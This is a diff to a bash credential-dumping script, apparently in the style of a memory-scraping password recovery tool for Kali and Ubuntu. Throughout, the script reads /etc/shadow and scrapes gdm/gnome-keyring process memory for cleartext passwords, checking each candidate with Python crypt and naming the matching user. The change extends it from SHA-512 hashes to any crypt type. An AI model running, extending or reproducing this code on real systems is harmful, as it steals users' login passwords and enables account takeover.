@@ -12,9 +12,6 @@ if [[ $EUID -ne 0 ]]; then
 	exit 1
 fi
 
-#Get shadow hash
-SHADOWHASHES="$(cat /etc/shadow | cut -d':' -f 2 | egrep '^\$6\$')"
-
 #If Kali
 if [[ `uname -a | awk '{print tolower($0)}'` == *"kali"* ]]; then
 	#get gdm-session-worker [pam/gdm-password] process
@@ -36,17 +33,18 @@ if [[ `uname -a | awk '{print tolower($0)}'` == *"ubuntu"* ]]; then
 	DUMP=$(strings "/tmp/dump.${PID}" | egrep '^.+libgck\-1\.so\.0$' -B 10 -A 10)
 fi
 
-#If hash in dump, print it
+#If hash not in dump get shadow hashes
 if [[ ! $HASH ]]; then
-	#Else Get shadow hashes
-	SHADOWHASHES="$(cat /etc/shadow | cut -d':' -f 2 | egrep '^\$6\$')"
+	SHADOWHASHES="$(cat /etc/shadow | cut -d':' -f 2 | egrep '^\$.\$')"
 fi
 
 #Determine password potential for each word
 while read -r line; do
 	#If hash in dump, prepare crypt line
 	if [[ $HASH ]]; then
-		CRYPT="\"$line\", \"\$6\$$SALT\""
+		#get ctype
+		CTYPE="$(echo $HASH | cut -c-3)"
+		CRYPT="\"$line\", \"$CTYPE$SALT\""
 		if [[ `python -c "import crypt; print crypt.crypt($CRYPT)"` == $HASH ]]; then
 			#Find which user's password it is (useful if used more than once!)
 			USER="$(cat /etc/shadow | grep ${HASH} | cut -d':' -f 1)"
@@ -55,8 +53,9 @@ while read -r line; do
 	#Else use shadow hashes
 	elif [[ $SHADOWHASHES ]]; then
 		while read -r thishash; do
+			CTYPE="$(echo $thishash | cut -c-3)"
 			SHADOWSALT="$(echo $thishash | cut -d'$' -f 3)"
-			CRYPT="\"$line\", \"\$6\$$SHADOWSALT\""
+			CRYPT="\"$line\", \"$CTYPE$SHADOWSALT\""
 			if [[ `python -c "import crypt; print crypt.crypt($CRYPT)"` == $thishash ]]; then
 				#Find which user's password it is (useful if used more than once!)
 				USER="$(cat /etc/shadow | grep ${thishash} | cut -d':' -f 1)"
@@ -64,7 +63,7 @@ while read -r line; do
 			fi
 		done <<< "$SHADOWHASHES"
 	else
-		echo "Password not found - is this system using sha256 hashes? (\$6\$)"
+		echo "[!] Password not found"
 	fi
 done <<< "$DUMP"
 
